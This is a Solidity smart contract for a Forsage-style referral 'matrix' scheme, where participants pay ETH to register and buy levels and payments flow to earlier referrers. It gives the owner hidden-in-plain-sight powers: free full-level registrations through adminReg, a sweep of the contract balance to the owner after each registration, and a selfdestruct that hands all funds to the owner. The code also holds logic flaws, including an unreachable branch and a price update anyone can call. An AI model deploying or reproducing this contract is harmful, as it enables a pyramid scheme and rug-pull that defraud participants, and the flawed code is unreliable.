pragma solidity >=0.4.23 <0.6.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IMakerPriceFeed {
  function read() external view returns (bytes32);
}

contract SmartMatrixForsage {
    
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        
        mapping(uint8 => bool) activeX3Levels;
        mapping(uint8 => bool) activeX6Levels;
        
        mapping(uint8 => X3) x3Matrix;
        mapping(uint8 => X6) x6Matrix;
    }
    
    struct X3 {
        address currentReferrer;
        address[] referrals;
        bool blocked;
        uint reinvestCount;
    }
    
    struct X6 {
        address currentReferrer;
        address[] firstLevelReferrals;
        address[] secondLevelReferrals;
        bool blocked;
        uint reinvestCount;

        address closedPart;
    }

    uint8 public constant LAST_LEVEL = 21;
    
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(address => uint) public balances; 

    uint public lastUserId = 2;
    address public owner;
    
    //mapping(uint8 => uint) public levelPrice;
    uint[22] public levelPrice;
    uint public regAmount = 0;
    uint public ethPrice;
    uint public initialFees = 0;
    uint public upgradeFees =0;
    ///////////////////////Daily Registration CountY/////////////////////////
    uint public dayReg=0;
    uint256 public distributeTime = now + 24 hours;
    function reg() private{
        if(now<distributeTime){
            dayReg++;
        }
        else{
            dayReg=1;
            distributeTime = now + 24 hours;
        }
    }
   ///////////////////////////////////////////////
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);
    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event MissedEthReceive(address indexed receiver, address indexed from, uint8 matrix, uint8 level);
    event SentExtraEthDividends(address indexed from, address indexed receiver, uint8 matrix, uint8 level);
    event EarnedEth(address indexed user,uint8 matrix, uint amount);
    event EthLevelLost(address indexed user,uint matrix ,uint level);
    
    ////////////////////////////AUTO PRICE UPDATE///////////////////////////////////////////////////////////
    uint256 public updateTime= now + 6 hours;
    function upprice() private{
        if(now<updateTime){
            
        }
        else{
            updateEtherPrices();
        }
    }
    
    function updateEtherPrices() public{
        updateTime = now + 6 hours;
        
        ethPrice=getETHUSDPrice();
        initialFees = SafeMath.div(uint(3 *  10000000000000000000000),ethPrice)*100000000000000;
        upgradeFees = SafeMath.div(uint(2 *  10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[1] = SafeMath.div(uint(5 *  10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[2] = SafeMath.div(uint(10 * 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[3] = SafeMath.div(uint(20 * 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[4] = SafeMath.div(uint(30 * 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[5] = SafeMath.div(uint(40 * 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[6] = SafeMath.div(uint(50 * 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[7] = SafeMath.div(uint(75 * 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[8] = SafeMath.div(uint(100 * 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[9] = SafeMath.div(uint(125 * 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[10] = SafeMath.div(uint(150* 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[11] = SafeMath.div(uint(200* 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[12] = SafeMath.div(uint(250* 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[13] = SafeMath.div(uint(300* 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[14] = SafeMath.div(uint(400* 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[15] = SafeMath.div(uint(500* 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[16] = SafeMath.div(uint(750* 10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[17] = SafeMath.div(uint(1000*10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[18] = SafeMath.div(uint(1250*10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[19] = SafeMath.div(uint(1500*10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[20] = SafeMath.div(uint(2000*10000000000000000000000),ethPrice)*100000000000000;
        levelPrice[21] = SafeMath.div(uint(3000*10000000000000000000000),ethPrice)*100000000000000;
        regAmount= 2*(levelPrice[1]+levelPrice[2]+levelPrice[3]) + initialFees + 4*upgradeFees;
    }
    
  function getETHUSDPrice() public view returns (uint) {
    address ethUsdPriceFeed = 0x729D19f657BD0614b4985Cf1D82531c67569197B;
    return uint(
      IMakerPriceFeed(ethUsdPriceFeed).read()
    );
  }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    constructor(address ownerAddress) public {
        //*********************\\
        updateEtherPrices();
        //*********************\\
        owner = ownerAddress;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activeX3Levels[i] = true;
            users[ownerAddress].activeX6Levels[i] = true;
        }
        
        userIds[1] = ownerAddress;
    }
    
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        
        registration(msg.sender, bytesToAddress(msg.data));
    }

    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
        reg();
    }
    
    function buyNewLevel(uint8 matrix, uint8 level) external payable {
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(matrix == 1 || matrix == 2, "invalid matrix");
        require(msg.value == (levelPrice[level]+upgradeFees), "invalid price");
        require(level > 1 && level <= LAST_LEVEL, "invalid level");
        //////////////// check for price update time and update time////////////////////
        upprice();
        /////////////////////////////////////////////////////////////////////////////////

        if (matrix == 1) {
            require(!users[msg.sender].activeX3Levels[level], "level already activated");

            if (users[msg.sender].x3Matrix[level-1].blocked) {
                users[msg.sender].x3Matrix[level-1].blocked = false;
            }
    
            address freeX3Referrer = findFreeX3Referrer(msg.sender, level);
            users[msg.sender].x3Matrix[level].currentReferrer = freeX3Referrer;
            users[msg.sender].activeX3Levels[level] = true;
            updateX3Referrer(msg.sender, freeX3Referrer, level);
            
            emit Upgrade(msg.sender, freeX3Referrer, 1, level);

        } else {
            require(!users[msg.sender].activeX6Levels[level], "level already activated"); 

            if (users[msg.sender].x6Matrix[level-1].blocked) {
                users[msg.sender].x6Matrix[level-1].blocked = false;
            }

            address freeX6Referrer = findFreeX6Referrer(msg.sender, level);
            
            users[msg.sender].activeX6Levels[level] = true;
            updateX6Referrer(msg.sender, freeX6Referrer, level);
            
            emit Upgrade(msg.sender, freeX6Referrer, 2, level);
        }
    }  
    //////////////////////////////**************************///////////////////////////////////////////////
    bool public registrationAllowed=false;
    function allowRegistration(bool allowed) public{
        require(msg.sender==owner,"Only Admin Can Call");
        registrationAllowed = allowed;
        
    }
    function adminReg(address userAddress, address referrerAddress) public{
        require(msg.sender==owner,"Only Admin Can Call");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[userAddress].activeX3Levels[i] = true;
            users[userAddress].activeX6Levels[i] = true;
        }
        
        userIds[lastUserId] = userAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++;
    }
    ///////////////////////////////*****************************//////////////////////////////////////////////
    
    function registration(address userAddress, address referrerAddress) private {
        require(registrationAllowed==true,"Registration Not Started");
        require(msg.value == regAmount, "registration cost 10$");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
        users[userAddress].activeX3Levels[1] = true; 
        users[userAddress].activeX6Levels[1] = true;
        
        
        userIds[lastUserId] = userAddress;
        lastUserId++;
        
        users[referrerAddress].partnersCount++;

        address freeX3Referrer = findFreeX3Referrer(userAddress, 1);
        users[userAddress].x3Matrix[1].currentReferrer = freeX3Referrer;
        updateX3Referrer(userAddress, freeX3Referrer, 1);

        updateX6Referrer(userAddress, findFreeX6Referrer(userAddress, 1), 1);
        
         ///////////////////////////////////////////////////////////////////// Second Register//////////////////////////////
        users[userAddress].activeX3Levels[2] = true; 
        users[userAddress].activeX6Levels[2] = true;
        address freeX3Referrer2 = findFreeX3Referrer(userAddress, 2);
        users[userAddress].x3Matrix[2].currentReferrer = freeX3Referrer2;
        updateX3Referrer(userAddress, freeX3Referrer2, 2);

        updateX6Referrer(userAddress, findFreeX6Referrer(userAddress, 2), 2);
        //*******************************************///////////////////////// Third Register//////////////////////////////
        
        users[userAddress].activeX3Levels[3] = true; 
        users[userAddress].activeX6Levels[3] = true;
        address freeX3Referrer3 = findFreeX3Referrer(userAddress, 3);
        users[userAddress].x3Matrix[3].currentReferrer = freeX3Referrer3;
        updateX3Referrer(userAddress, freeX3Referrer3, 3);

        updateX6Referrer(userAddress, findFreeX6Referrer(userAddress, 3), 3);
        ////////////////SEND REMAINING BALANCE////////////////////////////////
        sendBalance();
        //////////////////////////////////////////////////////////////////////
        
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    
    function updateX3Referrer(address userAddress, address referrerAddress, uint8 level) private {
        users[referrerAddress].x3Matrix[level].referrals.push(userAddress);

        if (users[referrerAddress].x3Matrix[level].referrals.length < 3) {
            emit NewUserPlace(userAddress, referrerAddress, 1, level, uint8(users[referrerAddress].x3Matrix[level].referrals.length));
            return sendETHDividends(referrerAddress, userAddress, 1, level);
        }
        
        emit NewUserPlace(userAddress, referrerAddress, 1, level, 3);
        
        //close matrix
        /*
        users[referrerAddress].x3Matrix[level].referrals = new address[](0);
        if (!users[referrerAddress].activeX3Levels[level+1] && level != LAST_LEVEL) {
            users[referrerAddress].x3Matrix[level].blocked = true;
        }*/

        //create new one by recursion
        if (referrerAddress != owner) {
            //check referrer active level
            address freeReferrerAddress = findFreeX3Referrer(referrerAddress, level);
            if (users[referrerAddress].x3Matrix[level].currentReferrer != freeReferrerAddress) {
                users[referrerAddress].x3Matrix[level].currentReferrer = freeReferrerAddress;
            }
            
            users[referrerAddress].x3Matrix[level].reinvestCount++;
            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 1, level);
            updateX3Referrer(referrerAddress, freeReferrerAddress, level);
        } else {
            sendETHDividends(owner, userAddress, 1, level);
            users[owner].x3Matrix[level].reinvestCount++;
            emit Reinvest(owner, address(0), userAddress, 1, level);
        }
    }

    function updateX6Referrer(address userAddress, address referrerAddress, uint8 level) private {
        require(users[referrerAddress].activeX6Levels[level], "500. Referrer level is inactive");
        
        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length < 2) {
            users[referrerAddress].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].firstLevelReferrals.length));
            
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = referrerAddress;

            if (referrerAddress == owner) {
                return sendETHDividends(referrerAddress, userAddress, 2, level);
            }
            
            address ref = users[referrerAddress].x6Matrix[level].currentReferrer;            
            users[ref].x6Matrix[level].secondLevelReferrals.push(userAddress); 
            
            uint len = users[ref].x6Matrix[level].firstLevelReferrals.length;
            
            if ((len == 2) && 
                (users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) &&
                (users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress)) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress, ref, 2, level, 5);
                } else {
                    emit NewUserPlace(userAddress, ref, 2, level, 6);
                }
            }  else if ((len == 1 || len == 2) &&
                    users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress, ref, 2, level, 3);
                } else {
                    emit NewUserPlace(userAddress, ref, 2, level, 4);
                }
            } else if (len == 2 && users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress, ref, 2, level, 5);
                } else {
                    emit NewUserPlace(userAddress, ref, 2, level, 6);
                }
            }

            return updateX6ReferrerSecondLevel(userAddress, ref, level);
        }
        
        users[referrerAddress].x6Matrix[level].secondLevelReferrals.push(userAddress);

        if (users[referrerAddress].x6Matrix[level].closedPart != address(0)) {
            if ((users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == 
                users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]) &&
                (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] ==
                users[referrerAddress].x6Matrix[level].closedPart)) {

                updateX6(userAddress, referrerAddress, level, true);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
            } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == 
                users[referrerAddress].x6Matrix[level].closedPart) {
                updateX6(userAddress, referrerAddress, level, true);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
            } else {
                updateX6(userAddress, referrerAddress, level, false);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
            }
        }

        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[1] == userAddress) {
            updateX6(userAddress, referrerAddress, level, false);
            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
        } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == userAddress) {
            updateX6(userAddress, referrerAddress, level, true);
            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
        }
        
        if (users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length <= 
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length) {
            updateX6(userAddress, referrerAddress, level, false);
        } else {
            updateX6(userAddress, referrerAddress, level, true);
        }
        
        updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
    }

    function updateX6(address userAddress, address referrerAddress, uint8 level, bool x2) private {
        if (!x2) {
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, users[referrerAddress].x6Matrix[level].firstLevelReferrals[0], 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));
            emit NewUserPlace(userAddress, referrerAddress, 2, level, 2 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[0];
        } else {
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, users[referrerAddress].x6Matrix[level].firstLevelReferrals[1], 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));
            emit NewUserPlace(userAddress, referrerAddress, 2, level, 4 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[1];
        }
    }
    
    function updateX6ReferrerSecondLevel(address userAddress, address referrerAddress, uint8 level) private {
        if (users[referrerAddress].x6Matrix[level].secondLevelReferrals.length < 4) {
            return sendETHDividends(referrerAddress, userAddress, 2, level);
        }
        
        address[] memory x6 = users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].firstLevelReferrals;
        
        if (x6.length == 2) {
            if (x6[0] == referrerAddress ||
                x6[1] == referrerAddress) {
                users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;
            } else if (x6.length == 1) {
                if (x6[0] == referrerAddress) {
                    users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;
                }
            }
        }
        
        users[referrerAddress].x6Matrix[level].firstLevelReferrals = new address[](0);
        users[referrerAddress].x6Matrix[level].secondLevelReferrals = new address[](0);
        users[referrerAddress].x6Matrix[level].closedPart = address(0);

        //close matrix
        /*
        if (!users[referrerAddress].activeX6Levels[level+1] && level != LAST_LEVEL) {
            users[referrerAddress].x6Matrix[level].blocked = true;
        }
        */
        
        users[referrerAddress].x6Matrix[level].reinvestCount++;
        
        if (referrerAddress != owner) {
            address freeReferrerAddress = findFreeX6Referrer(referrerAddress, level);

            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 2, level);
            updateX6Referrer(referrerAddress, freeReferrerAddress, level);
        } else {
            emit Reinvest(owner, address(0), userAddress, 2, level);
            sendETHDividends(owner, userAddress, 2, level);
        }
    }
    
    function findFreeX3Referrer(address userAddress, uint8 level) public returns(address) {
        int i=1;
        while (true) {
            if (users[users[userAddress].referrer].activeX3Levels[level]) {
                return users[userAddress].referrer;
            }
            else if(i==1){
                emit EthLevelLost(users[userAddress].referrer, 1 , level);
                i++;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }
    
    function findFreeX6Referrer(address userAddress, uint8 level) public returns(address) {
        int i=1;
        while (true) {
            if (users[users[userAddress].referrer].activeX6Levels[level]) {
                return users[userAddress].referrer;
            }
            else if(i==1){
                emit EthLevelLost(users[userAddress].referrer, 2 , level);
                i++;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }
    
    
    function usersActiveX3Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX3Levels[level];
    }

    function usersActiveX6Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX6Levels[level];
    }

    function usersX3Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool) {
        return (users[userAddress].x3Matrix[level].currentReferrer,
                users[userAddress].x3Matrix[level].referrals,
                users[userAddress].x3Matrix[level].blocked);
    }

    function usersX6Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, address[] memory, bool, address) {
        return (users[userAddress].x6Matrix[level].currentReferrer,
                users[userAddress].x6Matrix[level].firstLevelReferrals,
                users[userAddress].x6Matrix[level].secondLevelReferrals,
                users[userAddress].x6Matrix[level].blocked,
                users[userAddress].x6Matrix[level].closedPart);
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    function prices() public constant returns(uint[22]){
        return levelPrice;
        
    }

    function findEthReceiver(address userAddress, address _from, uint8 matrix, uint8 level) private returns(address, bool) {
        
        address receiver = userAddress;
        bool isExtraDividends;
        if (matrix == 1) {
            while (true) {
                if (users[receiver].x3Matrix[level].blocked) {
                    emit MissedEthReceive(receiver, _from, 1, level);
                    isExtraDividends = true;
                    receiver = users[receiver].x3Matrix[level].currentReferrer;
                } else {
                    return (receiver, isExtraDividends);
                }
            }
        } else {
            while (true) {
                if (users[receiver].x6Matrix[level].blocked) {
                    emit MissedEthReceive(receiver, _from, 2, level);
                    isExtraDividends = true;
                    receiver = users[receiver].x6Matrix[level].currentReferrer;
                } else {
                    return (receiver, isExtraDividends);
                }
            }
        }
        
    }

    function sendETHDividends(address userAddress, address _from, uint8 matrix, uint8 level) private {
        (address receiver, bool isExtraDividends) = findEthReceiver(userAddress, _from, matrix, level);
        
        if(receiver==0x0000000000000000000000000000000000000000){
            return;
        }
        if (!address(uint160(receiver)).send(levelPrice[level])) {
            return address(uint160(receiver)).transfer(address(this).balance);
        }
       
        emit EarnedEth(receiver ,matrix, levelPrice[level]);
        if (isExtraDividends) {
            emit SentExtraEthDividends(_from, receiver, matrix, level);
        }
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    
    function getEthBalance() public view returns(uint) {
        return address(this).balance;
    }
    
    function sendBalance() private
    {
         if (!address(uint160(owner)).send(getEthBalance()))
         {
             
         }
    }
    
    function close() public { 
        require(msg.sender==owner,"Must Be Owner !");
        selfdestruct(owner);  
}
    
}